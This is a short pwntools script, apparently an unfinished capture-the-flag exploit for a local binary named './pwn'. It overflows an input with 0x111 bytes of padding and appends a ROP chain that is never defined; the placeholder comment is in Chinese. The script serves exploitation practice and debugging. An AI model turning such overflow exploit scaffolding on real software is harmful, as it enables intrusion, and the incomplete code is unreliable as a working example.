#-*- encoding: utf-8 -*- 
from pwn import *
context.binary = './pwn'
context.log_level = 'debug'
context.timeout = None
elf = context.binary

def dbg():
	raw_input()



p = process('./pwn')
gdb.attach(p, 'b* 0x0804878D')

name = 'a' * 0xfe
occup = 'o' * 0xfe
p.sendlineafter("First, you need to tell me you name?\n", name)
p.sendlineafter("What's you occupation?\n", occup)
p.sendlineafter(']\n', 'Y')

payload = 'x'*0x111
payload += rop#			构建rop就行了
p.send(payload)

p.interactive()
p.close()